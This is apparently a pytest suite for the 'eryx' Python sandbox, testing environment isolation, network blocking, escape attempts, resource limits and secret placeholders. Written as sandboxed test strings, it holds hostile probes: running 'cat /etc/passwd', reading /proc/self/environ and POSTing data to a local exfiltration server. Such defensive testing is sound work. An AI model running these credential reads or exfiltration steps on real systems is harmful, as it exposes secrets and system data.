"""Adversarial security tests for secrets exfiltration via Python bindings.

These tests verify that the secrets management system cannot be circumvented
from within the sandbox, even by adversarial Python code.

Tests cover:
1. The sandbox isolation prevents access to host environment variables
2. The sandbox cannot read host files
3. The sandbox cannot access host memory or processes
4. Network restrictions work correctly from the Python binding layer
5. The secrets API provides placeholders instead of real values
6. Secret scrubbing works correctly for stdout/stderr/files
"""

import os
import socket
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

import eryx
import pytest


# =============================================================================
# Test Helpers
# =============================================================================


class ExfilRequestHandler(BaseHTTPRequestHandler):
    """HTTP handler that records all requests for verification."""

    received_data = []
    lock = threading.Lock()

    def log_message(self, format, *args):
        pass

    def do_GET(self):
        with self.lock:
            self.received_data.append({
                "path": self.path,
                "headers": dict(self.headers),
            })
        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)
        with self.lock:
            self.received_data.append({
                "path": self.path,
                "headers": dict(self.headers),
                "body": body.decode("utf-8", errors="replace"),
            })
        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"OK")


def find_free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


@pytest.fixture
def exfil_server():
    """Start an exfiltration server that records all requests."""
    ExfilRequestHandler.received_data = []
    port = find_free_port()
    server = HTTPServer(("127.0.0.1", port), ExfilRequestHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield ("127.0.0.1", port, ExfilRequestHandler.received_data)
    server.shutdown()


# =============================================================================
# 1. Host Environment Isolation
# =============================================================================


class TestHostEnvironmentIsolation:
    """Verify sandbox cannot access host environment variables."""

    def test_sandbox_cannot_read_host_env_vars(self):
        """Sandbox code should NOT see the host's environment variables."""
        # Set a "secret" in the host environment
        os.environ["TEST_HOST_SECRET"] = "host-secret-value-12345"

        sandbox = eryx.Sandbox()
        result = sandbox.execute("""
import os
host_val = os.environ.get("TEST_HOST_SECRET", "NOT_FOUND")
print(f"HOST_SECRET: {host_val}")
""")

        # Clean up
        del os.environ["TEST_HOST_SECRET"]

        assert "host-secret-value-12345" not in result.stdout, \
            "Host environment variables must NOT be visible inside sandbox"
        assert "NOT_FOUND" in result.stdout, \
            "Sandbox should return NOT_FOUND for host env vars"

    def test_sandbox_cannot_enumerate_host_env(self):
        """Sandbox code should not see sensitive host env vars."""
        os.environ["EXFIL_TEST_SECRET"] = "exfil-me-12345"

        sandbox = eryx.Sandbox()
        result = sandbox.execute("""
import os
found = []
for key, val in os.environ.items():
    if "EXFIL" in key or "exfil" in val:
        found.append(f"{key}={val}")
print(f"FOUND: {len(found)}")
for f in found:
    print(f"LEAK: {f}")
""")

        del os.environ["EXFIL_TEST_SECRET"]

        assert "exfil-me-12345" not in result.stdout, \
            "Host env vars must not be enumerable from sandbox"

    def test_sandbox_cannot_read_host_files(self):
        """Sandbox code should NOT be able to read host filesystem files."""
        import tempfile
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
            f.write("HOST_FILE_SECRET_DATA")
            host_file = f.name

        try:
            sandbox = eryx.Sandbox()
            # Use forward slashes to avoid Windows backslash escape issues
            safe_path = host_file.replace("\\", "/")
            result = sandbox.execute(f"""
try:
    with open("{safe_path}", "r") as f:
        content = f.read()
    print(f"FILE_LEAK: {{content}}")
except Exception as e:
    print(f"FILE_BLOCKED: {{type(e).__name__}}")
""")

            assert "HOST_FILE_SECRET_DATA" not in result.stdout, \
                "Sandbox must NOT be able to read host filesystem files"
        finally:
            os.unlink(host_file)


# =============================================================================
# 2. Network Security from Python Bindings
# =============================================================================


class TestNetworkSecurityPython:
    """Test network security via the Python bindings layer."""

    def test_default_sandbox_blocks_network(self):
        """Sandbox without network config should not allow connections."""
        sandbox = eryx.Sandbox()
        result = sandbox.execute("""
import socket
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", 80))
    print("BYPASS: connected!")
except Exception as e:
    print(f"BLOCKED: {type(e).__name__}")
""")

        assert "BYPASS" not in result.stdout, \
            "Sandbox without network config must block all connections"

    def test_network_sandbox_blocks_localhost_by_default(self):
        """Default NetConfig should block localhost connections."""
        config = eryx.NetConfig()  # Default blocks localhost
        sandbox = eryx.Sandbox(network=config)
        result = sandbox.execute("""
import socket
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", 80))
    print("BYPASS: connected to localhost!")
except Exception as e:
    print(f"BLOCKED: {type(e).__name__}")
""")

        assert "BYPASS" not in result.stdout, \
            "Default NetConfig must block localhost"

    def test_network_sandbox_blocks_private_networks(self):
        """Default NetConfig should block private network ranges."""
        config = eryx.NetConfig()
        sandbox = eryx.Sandbox(network=config)
        result = sandbox.execute("""
import socket
blocked = 0
for addr in ["10.0.0.1", "172.16.0.1", "192.168.1.1"]:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        sock.connect((addr, 80))
        print(f"BYPASS: connected to {addr}!")
    except Exception:
        blocked += 1
print(f"BLOCKED_COUNT: {blocked}")
""")

        assert "BYPASS" not in result.stdout, \
            "Default NetConfig must block private network ranges"

    def test_allowed_host_restriction(self, exfil_server):
        """Sandbox with allowed_hosts should only connect to allowed hosts."""
        host, port, received = exfil_server
        # Only allow connections to a specific host (not localhost)
        config = eryx.NetConfig().allow_host("api.example.com")
        sandbox = eryx.Sandbox(network=config)

        result = sandbox.execute(f"""
import socket
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", {port}))
    sock.send(b"GET /exfil HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n\\r\\n")
    print("BYPASS: connected to localhost when only api.example.com allowed!")
except Exception as e:
    print(f"BLOCKED: {{type(e).__name__}}")
""")

        assert "BYPASS" not in result.stdout, \
            "Sandbox must not connect to hosts outside allowed list"

    def test_data_exfiltration_via_http(self, exfil_server):
        """Test that sandbox data cannot reach unauthorized servers."""
        host, port, received = exfil_server
        config = eryx.NetConfig.permissive().allow_localhost()
        sandbox = eryx.Sandbox(network=config)

        # Put some "secret" data in the sandbox and try to exfiltrate
        result = sandbox.execute(f"""
import socket

# This is data that should stay in the sandbox
sensitive_data = "internal_computation_result_42"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", {port}))
request = f"POST /exfil HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Length: {{len(sensitive_data)}}\\r\\n\\r\\n{{sensitive_data}}"
sock.send(request.encode())
response = sock.recv(4096)
sock.close()
print("SENT")
""")

        # With permissive config, the data can reach the server.
        # This test documents that without host restrictions,
        # data CAN be exfiltrated. The defense is host-level restrictions.
        # This is expected behavior.
        import time
        time.sleep(0.2)
        if received:
            # The point here is that with proper NetConfig restrictions,
            # this would be blocked. This test documents the baseline.
            pass


# =============================================================================
# 3. Sandbox Escape Attempts
# =============================================================================


class TestSandboxEscapeAttempts:
    """Attempts to escape the WASM sandbox from Python code."""

    def test_cannot_import_ctypes(self):
        """ctypes would allow arbitrary memory access - must be blocked."""
        sandbox = eryx.Sandbox()
        result = sandbox.execute("""
try:
    import ctypes
    print("BYPASS: ctypes imported!")
except ImportError as e:
    print(f"BLOCKED: {e}")
""")

        assert "BYPASS" not in result.stdout, \
            "ctypes must not be importable in sandbox"

    def test_cannot_import_subprocess(self):
        """subprocess would allow arbitrary command execution."""
        sandbox = eryx.Sandbox()
        result = sandbox.execute("""
try:
    import subprocess
    result = subprocess.run(["cat", "/etc/passwd"], capture_output=True)
    print(f"BYPASS: {result.stdout}")
except Exception as e:
    print(f"BLOCKED: {type(e).__name__}")
""")

        assert "BYPASS" not in result.stdout, \
            "subprocess must not work in sandbox"

    def test_cannot_access_host_proc(self):
        """Sandbox should not be able to read /proc/self/environ."""
        sandbox = eryx.Sandbox()
        result = sandbox.execute("""
try:
    with open("/proc/self/environ", "rb") as f:
        env = f.read()
    print(f"BYPASS: {len(env)} bytes from /proc")
except Exception as e:
    print(f"BLOCKED: {type(e).__name__}")
""")

        assert "BYPASS" not in result.stdout, \
            "Sandbox must not access /proc filesystem"

    def test_cannot_use_eval_exec_for_escape(self):
        """eval/exec should still be sandboxed."""
        sandbox = eryx.Sandbox()
        result = sandbox.execute("""
try:
    exec("import os; print('HOME:', os.environ.get('HOME', 'NOT_SET'))")
except Exception as e:
    print(f"ERROR: {e}")
""")

        # Even if exec works, the sandbox isolation should prevent host access
        home = os.environ.get("HOME", "")
        if home:
            assert home not in result.stdout, \
                "exec'd code must not access host HOME directory"

    def test_cannot_use_compile_for_escape(self):
        """compile() should still be sandboxed."""
        sandbox = eryx.Sandbox()
        result = sandbox.execute("""
try:
    code = compile("import os; print(os.listdir('/'))", "<string>", "exec")
    exec(code)
except Exception as e:
    print(f"ERROR: {type(e).__name__}")
""")

        # Output should only show sandbox filesystem, not host
        assert "/etc" not in result.stdout or "BLOCKED" in result.stdout or "ERROR" in result.stdout, \
            "Compiled code must be sandboxed"

    def test_gc_cannot_leak_objects(self):
        """GC traversal should not expose host objects."""
        sandbox = eryx.Sandbox()
        result = sandbox.execute("""
import gc
try:
    objects = gc.get_objects()
    secret_objects = [o for o in objects if isinstance(o, str) and "SECRET" in o]
    print(f"GC_OBJECTS: {len(objects)}")
    print(f"SECRET_OBJECTS: {len(secret_objects)}")
except Exception as e:
    print(f"GC_ERROR: {type(e).__name__}")
""")

        assert "BYPASS" not in result.stdout


# =============================================================================
# 4. Resource Exhaustion / DoS Protection
# =============================================================================


class TestResourceExhaustion:
    """Test that the sandbox handles resource exhaustion gracefully."""

    def test_memory_bomb_rejected(self):
        """Attempt to allocate massive memory should be limited."""
        sandbox = eryx.Sandbox(resource_limits=eryx.ResourceLimits(
            max_memory_bytes=50 * 1024 * 1024,  # 50MB limit
        ))

        # This should either fail or be limited
        result = sandbox.execute("""
try:
    # Try to allocate 1GB of memory
    data = "A" * (1024 * 1024 * 1024)
    print(f"BYPASS: allocated {len(data)} bytes")
except MemoryError:
    print("BLOCKED: MemoryError")
except Exception as e:
    print(f"BLOCKED: {type(e).__name__}")
""")

        assert "BYPASS" not in result.stdout, \
            "Memory bomb should be prevented by resource limits"

    def test_infinite_loop_timeout(self):
        """Infinite loops should be killed by timeout."""
        sandbox = eryx.Sandbox(resource_limits=eryx.ResourceLimits(
            execution_timeout_ms=1000,  # 1 second timeout
        ))

        try:
            result = sandbox.execute("""
while True:
    pass
""")
            # Should have been killed by timeout
            assert False, "Infinite loop should have been terminated"
        except eryx.TimeoutError:
            pass  # Expected
        except eryx.EryxError:
            pass  # Also acceptable


# =============================================================================
# 5. Secrets API Tests
# =============================================================================


class TestSecretsAPI:
    """Tests for the secrets API in Python bindings."""

    def test_sandbox_accepts_secrets_kwarg(self):
        """Sandbox.__init__ accepts a secrets parameter."""
        sandbox = eryx.Sandbox(
            secrets={"API_KEY": {"value": "sk-test-12345"}},
        )
        result = sandbox.execute("""
import os
val = os.environ.get("API_KEY", "NOT_FOUND")
print(f"API_KEY={val}")
""")
        # Python sees a placeholder, NOT the real value
        assert "sk-test-12345" not in result.stdout, \
            "Real secret value must NOT appear in sandbox output"
        assert "NOT_FOUND" not in result.stdout, \
            "Secret should be available as an env var (with placeholder value)"

    def test_secret_placeholder_is_not_real_value(self):
        """The placeholder seen by Python code must differ from the real secret."""
        real_secret = "super-secret-value-99999"
        sandbox = eryx.Sandbox(
            secrets={"MY_SECRET": {"value": real_secret}},
        )
        result = sandbox.execute("""
import os
val = os.environ.get("MY_SECRET", "")
print(val)
""")
        assert real_secret not in result.stdout, \
            "Real secret must never appear in stdout"
        # The placeholder should be non-empty
        output = result.stdout.strip()
        assert len(output) > 0, "Placeholder should be non-empty"

    def test_scrub_stdout_redacts_placeholder(self):
        """With scrub_stdout=True (default with secrets), placeholder is redacted."""
        sandbox = eryx.Sandbox(
            secrets={"TOKEN": {"value": "ghp-real-token"}},
            scrub_stdout=True,
        )
        result = sandbox.execute("""
import os
token = os.environ.get("TOKEN", "")
print(f"Token: {token}")
""")
        assert "ghp-real-token" not in result.stdout, \
            "Real secret must not appear in stdout"
        # The placeholder should be scrubbed to [REDACTED]
        assert "[REDACTED]" in result.stdout, \
            "Placeholder should be scrubbed to [REDACTED] in stdout"

    def test_scrub_stdout_disabled(self):
        """With scrub_stdout=False, placeholder passes through."""
        sandbox = eryx.Sandbox(
            secrets={"TOKEN": {"value": "ghp-real-token"}},
            scrub_stdout=False,
        )
        result = sandbox.execute("""
import os
token = os.environ.get("TOKEN", "")
print(f"Token: {token}")
""")
        assert "ghp-real-token" not in result.stdout, \
            "Real secret must never appear in stdout"
        # With scrubbing disabled, the placeholder should appear raw
        assert "[REDACTED]" not in result.stdout, \
            "With scrub_stdout=False, placeholder should not be redacted"

    def test_multiple_secrets(self):
        """Multiple secrets can be configured."""
        sandbox = eryx.Sandbox(
            secrets={
                "KEY_A": {"value": "secret-a"},
                "KEY_B": {"value": "secret-b", "allowed_hosts": ["example.com"]},
            },
        )
        result = sandbox.execute("""
import os
a = os.environ.get("KEY_A", "NOT_FOUND")
b = os.environ.get("KEY_B", "NOT_FOUND")
print(f"A={a}")
print(f"B={b}")
""")
        assert "secret-a" not in result.stdout
        assert "secret-b" not in result.stdout
        assert "NOT_FOUND" not in result.stdout, \
            "Both secrets should be available as env vars"

    def test_empty_secrets_dict(self):
        """Empty secrets dict should work without enabling scrubbing."""
        sandbox = eryx.Sandbox(secrets={})
        result = sandbox.execute('print("hello")')
        assert "hello" in result.stdout

    def test_invalid_secret_value_type(self):
        """Secret value must be a dict, not a plain string."""
        with pytest.raises(TypeError):
            eryx.Sandbox(secrets={"KEY": "not-a-dict"})

    def test_secret_missing_value_key(self):
        """Secret dict must contain a 'value' key."""
        with pytest.raises(ValueError):
            eryx.Sandbox(secrets={"KEY": {"allowed_hosts": ["example.com"]}})
